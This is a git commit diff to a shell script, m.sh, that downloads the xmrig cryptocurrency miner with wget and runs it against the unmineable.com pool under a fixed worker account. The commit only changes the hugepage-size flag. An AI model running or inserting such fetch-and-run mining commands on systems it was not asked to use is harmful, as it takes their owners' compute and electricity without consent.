d0e993a7a29ec0fee78bfd385d0f4becfc5d61d0
moon-man8 <pentestbatross4@gmail.com>
2025-02-27 20:18:57 +0300

    Update m.sh

--- m.sh
+++ m.sh
@@ -7,4 +7,4 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux
 tar -xvzf xmrig-6.22.2-linux-static-x64.tar.gz
 
 # Run xmrig with the specified parameters
-xmrig-6.22.2/xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 --randomx-wrmsr=-1 --cpu-no-yield --hugepage-size=1048576 -k -u 1710454080.unmineable_worker_mbewwbsr -p x
+xmrig-6.22.2/xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 --randomx-wrmsr=-1 --cpu-no-yield --hugepage-size=4194304 -k -u 1710454080.unmineable_worker_mbewwbsr -p x
